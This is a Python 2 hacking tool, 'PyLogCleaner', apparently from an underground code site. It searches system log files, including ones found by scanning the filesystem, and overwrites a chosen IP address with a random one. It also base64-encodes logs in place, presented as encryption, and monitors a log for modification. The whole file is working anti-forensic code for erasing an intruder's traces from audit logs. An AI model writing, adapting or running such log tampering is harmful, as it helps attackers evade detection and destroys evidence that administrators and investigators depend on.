#!/usr/bin/python
#PyLogcleaner uses the list given (logfiles) containing
# 274 logfiles and uses the linux find 
#cmd to try and locate more logfiles to search
#for an ip address to replace with a random generated
#one. It can also encrypt/d3crypt a 
#logfile and also can watch a logfile for modifications.
#Email me with feedback, hints, criticism
#
#http://darkcode.ath.cx
#d3hydr8[at]gmail[dot]com

import os, sys, time, pwd, getopt, re, random, StringIO, commands

def title():
	print "\n   d3hydr8[at]gmail[dot]com PyLogCleaner v1.0"
	print "-----------------------------------------------"

def usage():
	title()
	print "\n  Usage: python logcleaner.py <option>\n"
	print "\t[options]"
	print "\t   -i <ip>: Ip to search for and replace"
	print "\t   -e <file>: Encrypts logfile"
	print "\t   -d <file>: Decrypts logfile"
	print "\t   -w/-watch <file> <time to check> : Watches logfile for modification"
	print "\t   -h/-help: Prints this menu\n"

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def validater(logs):
	
	activeLogs = []

	print "[+] Validating:",len(logs),"logfiles\n"
	for l in logs:
		if os.path.isfile(l) == True:
			activeLogs.append(l)
	if len(activeLogs)>0:
		print "[+] Active Logs Found:",len(activeLogs)
		return activeLogs
	else:
		print "[-] No Active Logs Found"
		sys.exit(1)
		
def search(logfiles):
	
	print "\n[+] Searching:",ip,"\n"
	import mmap
	
	for file in logfiles:
		try:
			f = open(file, "rb+")
			size = os.path.getsize(file)
			if size >= 1:
				data = mmap.mmap(f.fileno(), size)
				loc = data.find(ip)
				#Lets not search a file with no data.
				if loc == -1:
					#print "[+] File:",file,"|",size,"bytes"
					#print "\t[-] IP not found"
					data.close()
				else:
					print "-"*45
					print "[+] File:",file,"|",size,"bytes"
					print "\t[+] IP found"
					data.seek(loc)
					data.write(randip)
					print "[+] Replaced: ",ip,">>",randip
					print "[+] New_Size:",os.path.getsize(file),"bytes"
					print "-"*45
					data.close()
		except(IOError), msg:
			pass
	print "\n[+] Done:",timer(),"\n"
					
def findlogs():
	os.chdir("/")
	
	print "[+] Finding More Logfiles..."
	#Lets use the linux find cmd to fing more files containing log...
	logz = StringIO.StringIO(commands.getstatusoutput('find . -iname *log -perm -444 -print')[1]).readlines()
	if len(logz)>0:
		print "[+] Found:",len(logz),"extra logfiles"
		for log in logz:
			if re.search("Permission denied",log) == None:
				logs.append(log[:-1]) 
	return logs
	
def randip():
	
	A = random.randrange(255) + 1
	B = random.randrange(255) + 1
	C = random.randrange(255) + 1
	D = random.randrange(255) + 1
	randip = "%d.%d.%d.%d" % (A,B,C,D)
	return randip

def gettime():
	clock = time.asctime(time.localtime(os.path.getmtime(logfile)))
	return clock

def getsize():
	size = os.path.getsize(logfile)
	return size

def modlast(logfile):
	try: 
		sys.argv[3]
	except(IndexError):
		print "\n[-] Need a time in seconds (ex: 60)\n"
		sys.exit(1)
		
	print "[+] Analyzing:",logfile
	print "[+] Time:",sys.argv[3],"secs"
	print "[+] Owner:",pwd.getpwuid(os.stat(logfile)[4])[0]
	print "[+] Size:",getsize(),"bytes"
	print "[+] Last Modified:",gettime()
	print "[+] Starting:",timer()

	old_time = gettime()
	while True:
		time.sleep(int(sys.argv[3]))
		new_time = gettime()
		if new_time != old_time:
			print "\n[+] File Modified:",new_time
			print "[+] New Size:",getsize(),"bytes\n"
			old_time = new_time
	
def encrypter(file):
	import base64
	print "\n[+] Encrypting:",file
	print "[+] Size:",os.path.getsize(file),"bytes"
	try:
  		log2encode = open(file, "r").read()
	except(IOError): 
  		print "Error: Check your full path.\n"
  		sys.exit(1)
	log2encode = base64.b64encode(log2encode)
	os.remove(file)
	time.sleep(2)
	f = open(file, "a")
	f.write(log2encode)
	f.close()
	print "[+] NewSize:",os.path.getsize(file),"bytes"
	print "[+] Done\n"

def d3crypter(file):
	import base64
	print "\n[+] Decrypting:",file
	print "[+] Size:",os.path.getsize(file),"bytes"
	try:
  		b2log = open(file, "r").read()
	except(IOError): 
  		print "Error: Check your full path.\n"
  		sys.exit(1)
	b2log = base64.b64decode(b2log)
	os.remove(file)
	time.sleep(2)
	f = open(file, "a")
	f.write(b2log)
	f.close()
	print "[+] NewSize:",os.path.getsize(file),"bytes"
	print "[+] Done\n"

if len(sys.argv) <= 1:
	usage()
	sys.exit(1)
if len(sys.argv) == 2:
	usage()
	sys.exit(1)

if sys.argv[1] == "-w" or sys.argv[1] == "-watch":
	logfile = sys.argv[2]
	if os.path.isfile(logfile) == False:
		title()
		print "\n[-] Cannot Open File, Check Full Path!!!\n"
		sys.exit(1)
	else:
		title()
		modlast(logfile)
if sys.argv[1] == "-i":
	ip = sys.argv[2]		
	try:
  		logs = open("logfiles", "r").readlines()
	except(IOError): 
  		print "Error: logfiles missing\n"
  		sys.exit(1)
	title()
	print "\n[+] Starting:",timer()
	print "[+] Loaded:",len(logs),"logs"
	findlogs()
	randip = randip()
	print "[+] Generate Random IP:",randip
	search(validater(logs))
if sys.argv[1] == "-e":
	file = sys.argv[2]
	title()
	encrypter(file)
if sys.argv[1] == "-d":
	file = sys.argv[2]
	title()
	d3crypter(file)




